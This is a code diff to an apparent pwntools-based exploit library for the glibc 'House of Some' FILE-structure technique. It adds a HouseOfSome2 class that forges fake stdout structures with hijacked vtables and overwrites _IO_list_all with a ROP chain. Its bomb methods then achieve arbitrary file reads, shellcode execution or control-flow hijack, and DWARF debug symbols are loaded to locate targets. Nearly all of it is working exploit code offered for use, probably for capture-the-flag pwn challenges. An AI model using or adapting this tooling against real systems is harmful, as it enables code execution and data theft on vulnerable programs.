@@ -11,8 +11,10 @@ from typing import Callable
 
 class HouseOfSome:
 
-    def __init__(self, libc: ELF, controled_addr, zero_addr=0):
+    def __init__(self, libc: ELF, controled_addr: int = 0, zero_addr: int = 0):
         self.libc = libc
+        if controled_addr == 0:
+            controled_addr = self.libc.symbols['_environ'] + 0x10
         self.controled_addr =controled_addr
         self.READ_LENGTH_DEFAULT = 0x400
         self.LEAK_LENGTH = 0x500
@@ -111,6 +113,9 @@ class HouseOfSome:
         assert b"\n" not in payload, "\\n in payload."
         return payload
     
+    def get_first_fake_file(self):
+        return self.hoi_read_file_template(self.controled_addr, 0x400, self.controled_addr, 0)
+ 
     def write(self, fd, buf, len):
         addr = self.controled_addr
         f_write_file = self.fake_file_write_template(buf, buf+len, addr+self.write_file_length, fd) 
@@ -191,6 +196,7 @@ class HouseOfSome:
 
         log.info(f"pop_rax_call_rax: {pop_rax_call_rax:#x}")
     
+
         rop = ROP(self.libc)
         rop.base = stack
         rop.call('mprotect', [stack & (~0xfff), 0x1000, 7])
@@ -272,9 +278,168 @@ class HouseOfSome:
                 next_flush = True
 
         return got_ret_addr
-            
-            
+
+def get_debug_filename(elf: ELF):
+    build_id = elf.buildid.hex()
+    filename = f"/usr/lib/debug/.build-id/{build_id[:2]}/{build_id[2:]}.debug"
+    return filename
+
+class DWARF_ELF(ELF):
+    """
+    A class to handle DWARF debug information in ELF files.
+    """
+    def _populate_got(self):
+        pass
+
+class ELF_with_DWARF(ELF):
+    """
+    Extends the ELF class to include DWARF debug information.
+    """
+    def __init__(self, *args, debuginfo_filepath: str = None, **kwargs):
+        super().__init__(*args, **kwargs)
+
+        if debuginfo_filepath is None:
+            debuginfo_file = get_debug_filename(self)
+        else:
+            debuginfo_file = debuginfo_filepath
+        if not os.path.exists(debuginfo_file):
+            log.warn(f"Debug info file not found: {debuginfo_file}")
+            return 
+        log.info(f"Using debuginfo file: {debuginfo_file}")
+        self.dwarf_elf: DWARF_ELF = DWARF_ELF(debuginfo_file, checksec=False)
+        self._add_symbols()
+    
+    def _add_symbols(self):
+        two_have = self.symbols.keys() & self.dwarf_elf.symbols.keys()
+        for k in two_have:
+            assert self.symbols[k] == self.dwarf_elf.symbols[k]
         
+        self.symbols.update({
+            k: v for k, v in self.dwarf_elf.symbols.items() if k not in self.symbols
+        })
+
+        two_have = self.functions.keys() & self.dwarf_elf.functions.keys()
+        # self.functions: dict[str, Function]
+        # self.dwarf_elf.functions: dict[str, Function]
+        for k in two_have:
+            assert self.functions[k].name == self.dwarf_elf.functions[k].name
+            assert self.functions[k].address == self.dwarf_elf.functions[k].address
+            assert self.functions[k].size == self.dwarf_elf.functions[k].size
+        
+        self.functions.update({
+            k: v for k, v in self.dwarf_elf.functions.items() if k not in self.functions
+        })            
+    
+    @classmethod
+    def from_ELF(cls, elf: ELF):
+        """
+        Create an instance of ELF_with_DWARF from an existing ELF object.
+        """
+        if not isinstance(elf, ELF):
+            raise TypeError("Expected an ELF object.")
+        obj = cls(elf.file.name, debuginfo_filepath=get_debug_filename(elf), checksec=elf.checksec)
+        obj.address = elf.address
+        return obj
+
+
+class HouseOfSome2:
+    def __init__(self, libc: ELF, fake_stdout_addr: int = 0, controled_addr: int = 0, zero_addr: int = 0):
+        self.libc = ELF_with_DWARF.from_ELF(libc)
+        self.hos = HouseOfSome(self.libc, controled_addr, zero_addr)
+        if fake_stdout_addr == 0:
+            fake_stdout_addr = self.libc.symbols['_IO_2_1_stdout_']
+            log.success(f"Using Default _IO_2_1_stdout_ as fake_stdout_addr: {fake_stdout_addr:#x}")
+        self.fake_stdout_addr = fake_stdout_addr
+
+        self._IO_wfile_jumps_maybe_mmap = self.libc.symbols['_IO_wfile_jumps_maybe_mmap']
+        log.success(f"_IO_wfile_jumps_maybe_mmap: {self._IO_wfile_jumps_maybe_mmap:#}")
+        self._IO_str_jumps = self.libc.symbols['_IO_str_jumps']
+        log.success(f"_IO_str_jumps: {self._IO_str_jumps:#}")
+        self._IO_default_xsputn = self._IO_str_jumps + 0x38
+        self._IO_default_xsgetn = self._IO_str_jumps + 0x40
+
+    
+    def get_first_fake_stdout(self):
+        return flat({
+                0x0: 0x8000, # disable lock
+                0x38: self.fake_stdout_addr, # _IO_buf_base
+                0x40: self.fake_stdout_addr + 0x1c8, # _IO_buf_end
+                0x70: 0, # _fileno
+                0xa0: self.fake_stdout_addr + 0x100, # +0xe0可写即可
+                0xc0: p32(0xffffffff), # _mode < 0
+                0xd8: self._IO_wfile_jumps_maybe_mmap - 0x18,
+            }, filler=b"\x00")
+
+    def bomb_prepare(self, io: tube, first_fake_file_addr: int, mov_qword_rsi_rdi: int = 0):
+        if mov_qword_rsi_rdi == 0:
+            mov_qword_rsi_rdi = next(self.libc.search(b'H\x89>\xc3', executable=True))
+            log.info(f"Default mov_qword_rsi_rdi found: {mov_qword_rsi_rdi:#x}")
+        log.success(f"`mov qword ptr [rsi], rdi; ret;` gadget found: {mov_qword_rsi_rdi:#x}")
+        rop = ROP(self.libc)
+        rop.rdi = first_fake_file_addr
+        rop.rsi = self.libc.symbols['_IO_list_all']
+        rop.raw(mov_qword_rsi_rdi)
+        rop.call('exit')
+        rop_chain = rop.chain()
+        log.info(rop.dump())
+
+        io.send(flat({
+            0x8: self.fake_stdout_addr, # 需要可写地址
+            
+            0x38: self.fake_stdout_addr - 0x1c8 + 0xc8, # _IO_buf_base
+            0x40: self.fake_stdout_addr + 0x1c8, # _IO_buf_end
+            0xa0: self.fake_stdout_addr + 0xe0,   
+            0xc0: p32(0xffffffff),
+            
+            0xd8: self._IO_default_xsputn - 0x90, # vtable
+            0x28: self.fake_stdout_addr - 0x1c8, # _IO_write_ptr
+            0x30: self.fake_stdout_addr, # _IO_write_end
+
+            0xe0: {
+                0xe0: self._IO_wfile_jumps_maybe_mmap
+            }
+        }, filler=b"\x00"))
+
+        io.send(flat({
+            # 0: [
+            # pop_rdi, fake_file,
+            # pop_rsi, libc.symbols['_IO_list_all'],
+            # mov_qword_rsi_rdi,
+            # libc.symbols['exit'],
+            # ],
+            0: rop_chain,
+            0x1c8-0xc8: {
+                0x38: self.fake_stdout_addr - 0x1c8 + 0xc8, # _IO_buf_base
+                0x40: self.fake_stdout_addr + 0x1c8, # _IO_buf_end
+                0xa0: self.fake_stdout_addr + 0xe0,   
+                0xc0: p32(0xffffffff),
+
+                0xd8: self._IO_default_xsgetn - 0x90, # vtable
+                0x08: self.fake_stdout_addr - 0x1c8, # _IO_read_ptr
+                0x10: self.fake_stdout_addr + (0x1c8 - 0xc8), # _IO_read_end
+
+                0xe0: {
+                    0xe0: self._IO_wfile_jumps_maybe_mmap
+                }
+        }
+        }, filler=b"\x00"))
+    
+    def bomb(self, io: tube, fake_stdout_addr: int, retn_addr=0, offset=0):
+        self.bomb_prepare(io, fake_stdout_addr)
+        self.hos.bomb(io, retn_addr, offset)
+    
+    def bomb_orw(self, io: tube, fake_stdout_addr: int, file_path: bytes, read_length: int=0x40, retn_addr=0, offset=0):
+        self.bomb_prepare(io, fake_stdout_addr)
+        self.hos.bomb_orw(io, file_path, read_length, retn_addr, offset)
+    
+    def bomb_shellcode(self, io: tube, fake_stdout_addr: int, shellcode: bytes, pop_rax_call_rax: int=0, retn_addr=0, offset=0):
+        self.bomb_prepare(io, fake_stdout_addr)
+        self.hos.bomb_shellcode(io, shellcode, pop_rax_call_rax, retn_addr, offset)
+    
+    def bomb_raw(self, io: tube, fake_stdout_addr: int, retn_addr=0, offset=0):
+        self.bomb_prepare(io, fake_stdout_addr)
+        return self.hos.bomb_raw(io, retn_addr, offset)
+
 
 
 class IO_jumps_t:
